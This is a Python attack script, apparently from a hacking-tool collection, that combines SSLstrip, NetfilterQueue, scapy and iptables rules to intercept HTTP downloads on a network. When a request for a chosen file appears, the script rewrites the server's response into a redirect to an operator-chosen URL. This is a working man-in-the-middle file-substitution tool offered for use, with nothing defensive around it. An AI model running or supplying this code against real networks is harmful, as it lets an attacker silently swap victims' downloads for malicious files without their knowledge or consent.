#!/usr/bin/python

from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import argparse
import subprocess

ack_list = []

def set_load(packet,load):
    # overwrite the raw section
    packet[scapy.Raw].load=load
    # recalculate len and hashes 
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def spoof_packet(packet):
    # convert packets to scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # check if packet has HTTP request/response
    if scapy_packet.haslayer(scapy.Raw):
        # SSLstrip works on port 10,000
        if scapy_packet[scapy.TCP].dport == 10000:
            # print (scapy_packet.show())
            if (options.source_file in scapy_packet[scapy.Raw].load) and (options.dest_file not in scapy_packet[scapy.Raw].load):
                print ("[+] Request found for {}".format(options.source_file))
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            # check if response matches seen request
            if scapy_packet[scapy.TCP].seq in ack_list:
                # remove from list if seen
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print ("[+] Replacing response with {}".format(options.dest_file))
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(options.dest_file))
                # overwrite the original packet
                packet.set_payload(str(modified_packet))
    # send the packet        
    packet.accept()


parser=argparse.ArgumentParser(description="HTTPS File interceptor")
parser.add_argument("-s","--source-file",dest="source_file",help="Specify an source file to spoof [case sensitive]", required=True)
parser.add_argument("-r","--destination-file",dest="dest_file",help="Specify an destination file to be served (url)", required=True)
parser.add_argument("-q","--queue-num",dest="queue_num",help="iptables queue number", default=0, type=int)
options = parser.parse_args()

queue = NetfilterQueue()

print ("[+] This program requires you to run SSLstrip in seperate terminal!")
input("Please run sslstrip in seperate tab and press any key...")
try:
    try:
        print ("[+] setting up iptable rules")
        # flush ip tables
        subprocess.call(["iptables", "--flush"])
        # forward input chain
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
        # forward output chain
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(options.queue_num)])
        # modifying nat tables for altering prerouting rule
        subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
        print ("[+] forwarding packets to queue: {}".format(options.queue_num))
    except Exception as err:
        print ("[-] Something went wrong forwarding packets, possible issue could be less privilege, run as root")
        print (parser.print_help())
        exit()
    
    # register call back with queue number   
    queue.bind(options.queue_num, spoof_packet)
    # execute
    print ("Done, watch carefully")
    queue.run()
except KeyboardInterrupt:
    print ("\n[+] Detected CTRL+C... Please wait..")
    try:
        print ("Attempting to restore iptables")
        subprocess.call(["iptables", "--flush"])
    except Exception as err:
        print ("[-] Something went wrong while flusing iptables, please restore it manually")

